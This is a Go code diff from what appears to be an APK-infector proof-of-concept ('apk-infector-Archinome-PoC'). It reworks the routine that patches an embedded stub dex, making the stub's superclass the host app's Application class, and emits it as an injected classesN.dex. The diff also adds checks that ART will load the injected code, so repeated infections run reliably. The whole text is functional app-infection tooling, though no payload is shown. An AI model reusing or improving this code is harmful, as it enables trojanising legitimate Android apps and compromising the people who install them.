@@ -3,11 +3,11 @@ package dex
 import (
 	"bytes"
 	"crypto/sha1"
+	_ "embed"
 	"encoding/binary"
 	"fmt"
 	"hash/adler32"
 	"log"
-	"os"
 	"path/filepath"
 	"strings"
 
@@ -15,6 +15,13 @@ import (
 	"github.com/thatskriptkid/apk-infector-Archinome-PoC/internal/utils"
 	"github.com/thatskriptkid/apk-infector-Archinome-PoC/pkg/manifest"
 )
+
+// pristineStub is the wrapper stub exactly as committed (placeholder superclass
+// Lz/z/z;, spec-valid hashes). Patch() derives every injection from this copy,
+// so the tool is repeatable and no run can corrupt the fixture on disk.
+//
+//go:embed testdata/stub_pristine.dex
+var pristineStub []byte
 
 const (
 	// DEX structure offsets
@@ -145,17 +152,19 @@ func RenameDescriptor(f *DexFile, from, to string) (int, error) {
 }
 
 // Patch renames the stub's placeholder superclass to the host Application class
-// and rewrites StubPath() in place with a canonical dex emitted by the writer
-// (sorted string_ids, recomputed offsets/checksum/signature).
+// and writes the result to dexPathNew (InjectedApp_patched.dex), which the
+// injector then seals as classesN.dex.
+//
+// The source is the embedded pristine stub, never the on-disk fixture: writing
+// the patched dex back over InjectedApp.dex made the tool single-shot — the
+// next run parsed an already-renamed stub and died with
+// `descriptor "Lz/z/z;" not found in the string table`.
 func Patch() {
-	data, err := os.ReadFile(dexPath)
-	if err != nil {
-		log.Panicf("DEX Failed to read %s: %v", dexPath, err)
-	}
+	data := pristineStub
 
 	f, err := Parse(data)
 	if err != nil {
-		log.Panicf("DEX Failed to parse %s: %v", dexPath, err)
+		log.Panicf("DEX Failed to parse the embedded stub: %v", err)
 	}
 
 	// Target: the host's own Application class, or the framework one when the
@@ -169,19 +178,31 @@ func Patch() {
 
 	n, err := RenameDescriptor(f, placeholderDescriptor, target)
 	if err != nil {
-		log.Panicf("DEX %s: %v", dexPath, err)
+		log.Panicf("DEX stub: %v", err)
 	}
 
 	out, err := f.Encode()
 	if err != nil {
-		log.Panicf("DEX Failed to emit %s: %v", dexPath, err)
+		log.Panicf("DEX Failed to emit the stub: %v", err)
 	}
-	if err := os.WriteFile(dexPath, out, 0644); err != nil {
-		log.Panicf("DEX Failed to write %s: %v", dexPath, err)
-	}
-	// The injector seals InjectedApp_patched.dex as classesN.dex.
 	utils.WriteChanges(out, dexPathNew)
+
+	// The dex that actually ships must be loadable by ART: header hashes intact,
+	// the wrapper class defined, its superclass resolved to the host Application
+	// class, and the string table still sorted (ART binary-searches it). The gate
+	// lives here, next to the bytes, so no caller can skip it.
+	if err := Validate(dexPathNew, manifest.WrapperClassName()); err != nil {
+		log.Panicf("dex patch produced an unusable stub dex (%v)", err)
+	}
+	if err := ValidateSuperclass(dexPathNew, manifest.WrapperClassName(), hostFQN); err != nil {
+		log.Panicf("stub dex superclass mismatch (%v)", err)
+	}
 
 	log.Printf("DEX writer: %s -> %s (%d string(s) renamed, %d -> %d bytes)",
 		placeholderDescriptor, target, n, len(data), len(out))
 }
+
+// PatchedStubPath returns the dex Patch() just produced — the file the injector
+// seals as classesN.dex. The fixture on disk (InjectedApp.dex) stays pristine:
+// it is only ever a source, never an output.
+func PatchedStubPath() string { return dexPathNew }
